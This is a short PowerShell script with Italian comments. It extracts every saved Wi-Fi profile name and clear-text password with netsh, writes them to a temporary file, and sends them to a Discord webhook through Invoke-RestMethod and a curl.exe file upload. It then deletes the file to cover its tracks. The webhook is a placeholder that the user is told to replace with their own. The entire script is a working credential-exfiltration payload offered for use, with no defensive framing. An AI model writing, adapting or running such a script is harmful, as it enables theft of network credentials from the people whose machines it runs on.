############################################################################################################################################################
# Estrae le password dei profili Wi-Fi e le salva in un file temporaneo
$wifiProfiles = (netsh wlan show profiles) | 
    Select-String "\:(.+)$" | 
    ForEach-Object {
        $name = $_.Matches.Groups[1].Value.Trim()
        $pass = (netsh wlan show profile name="$name" key=clear | 
                 Select-String "Key Content\W+\:(.+)$").Matches.Groups[1].Value.Trim()
        
        # Restituisci il profilo Wi-Fi e la password
        [PSCustomObject]@{ PROFILE_NAME = $name; PASSWORD = $pass }
    }

# Crea il messaggio per Discord
$message = "Ecco le password dei profili Wi-Fi salvati:`n`n"
foreach ($profile in $wifiProfiles) {
    $message += "Profilo: $($profile.PROFILE_NAME)`nPassword: $($profile.PASSWORD)`n`n"
}

# Salva i profili e le password in un file temporaneo
$outputFile = "$env:TEMP\wifi-passwords.txt"
$message | Out-File -FilePath $outputFile -Encoding utf8

############################################################################################################################################################

# Funzione per caricare le password su Discord
function Upload-Discord {
    param (
        [string]$WebhookUrl,
        [string]$Message,
        [string]$FilePath
    )

    $Body = @{
        'username' = $env:username
        'content'  = $Message
    }

    # Invia il messaggio di testo
    if (-not [string]::IsNullOrEmpty($Message)) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $WebhookUrl -Method Post -Body ($Body | ConvertTo-Json)
    }

    # Carica il file delle password
    if (Test-Path $FilePath) {
        curl.exe -F "file1=@$FilePath" $WebhookUrl
    }
}

# Carica le password su Discord
$discordWebhookUrl = "WEBHOOK_DISCORD"  # Sostituisci con il tuo URL Webhook Discord
if (-not [string]::IsNullOrEmpty($discordWebhookUrl)) {
    Upload-Discord -WebhookUrl $discordWebhookUrl -Message "Ecco le password dei profili Wi-Fi salvati:" -FilePath $outputFile
}

############################################################################################################################################################

# Pulizia dei file temporanei (opzionale)
Remove-Item $outputFile -ErrorAction SilentlyContinue

# Visualizza un messaggio indicante la fine dell'operazione
Write-Host "Le password Wi-Fi sono state inviate a Discord."
